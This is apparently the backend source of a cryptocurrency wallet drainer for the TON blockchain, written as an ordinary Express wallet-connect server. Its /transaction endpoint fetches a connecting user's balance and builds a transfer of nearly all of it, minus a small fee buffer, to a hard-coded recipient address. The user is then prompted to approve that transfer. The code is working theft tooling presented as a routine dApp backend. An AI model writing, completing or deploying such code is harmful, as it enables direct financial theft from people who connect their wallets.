const express = require("express");
const path = require("path");
const bodyParser = require("body-parser");
const axios = require("axios");

const app = express();

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public"))); // serve static frontend files

// --- In-memory store (replace with DB if needed) ---
let connectedWallets = [];

// Root page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public/html/index.html"));
});

/**
 * Connected: called when frontend detects wallet connection
 */
app.post("/connected", (req, res) => {
  console.log("🔗 Wallet connected:", req.body);
  if (!connectedWallets.includes(req.body.wallet)) {
    connectedWallets.push(req.body.wallet);
  }
  res.json({ status: "ok", message: "Wallet connected" });
});

/**
 * Disconnect: called when user clicks "Disconnect"
 */
app.post("/disconnect", (req, res) => {
  console.log("🔌 Wallet disconnected:", req.body);
  connectedWallets = connectedWallets.filter(w => w !== req.body.wallet);
  res.json({ status: "ok", message: "Wallet disconnected" });
});

/**
 * Get wallet balance in nanotons
 */
async function getWalletBalance(address) {
  try {
    const res = await axios.get(`https://tonapi.io/v2/accounts/${address}`);
    // The balance is usually in res.data.account.balance
    return res.data.account.balance; 
  } catch (err) {
    console.error("❌ Error fetching balance:", err.response?.data || err.message);
    return null;
  }
}

/**
 * Transaction: frontend fetches this before sending transaction
 * Deducts buffer; fails gracefully if balance is too small.
 */
app.get("/transaction", async (req, res) => {
  const userWallet = req.query.wallet; // now fetches &wallet= from URL
  console.log("💰 Transaction request from:", userWallet);

  if (!userWallet) {
    return res.status(400).json({ error: "Wallet address missing" });
  }

  const recipientAddress = "EQCxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";

  const balanceNanoTon = await getWalletBalance(userWallet);
  if (!balanceNanoTon) {
    return res.status(500).json({ error: "Could not fetch balance" });
  }

  const balanceTon = balanceNanoTon / 1e9;

  if (balanceTon < 0.05) {
    console.log(`⚠️ Balance too low (${balanceTon} TON). Not building transaction.`);
    return res.json({
      messages: [
        { address: recipientAddress, amount: "0", payload: "" }
      ],
      raw: { from: userWallet, to: recipientAddress, amount: "0" }
    });
  }

  let bufferTon = 0.05;
  if (balanceTon > 100) bufferTon = 0.8;
  else if (balanceTon > 10) bufferTon = 0.5;
  else if (balanceTon > 1) bufferTon = 0.2;

  const sendTon = Math.max(balanceTon - bufferTon, 0);
  const sendNanoTon = Math.floor(sendTon * 1e9);

  console.log(`📊 Balance: ${balanceTon} TON, Deduction: ${bufferTon} TON, Sending: ${sendTon} TON`);

  const tx = {
    messages: [
      {
        address: recipientAddress,
        amount: sendNanoTon.toString(),
        payload: ""
      }
    ],
    raw: {
      from: userWallet,
      to: recipientAddress,
      amount: sendNanoTon.toString()
    }
  };

  res.json(tx);
});

/**
 * Accept: frontend calls this when user approves transaction
 */
app.post("/accept", (req, res) => {
  console.log("✅ Transaction accepted:", req.body);
  res.json({ status: "ok", message: "Transaction accepted" });
});

/**
 * Reject: frontend calls this when user rejects transaction
 */
app.post("/reject", (req, res) => {
  console.log("❌ Transaction rejected:", req.body);
  res.json({ status: "ok", message: "Transaction rejected" });
});

// --- Start server ---
const PORT = 7860;
app.listen(PORT, () => {
  console.log(`🚀 Backend running at http://localhost:${PORT}`);
});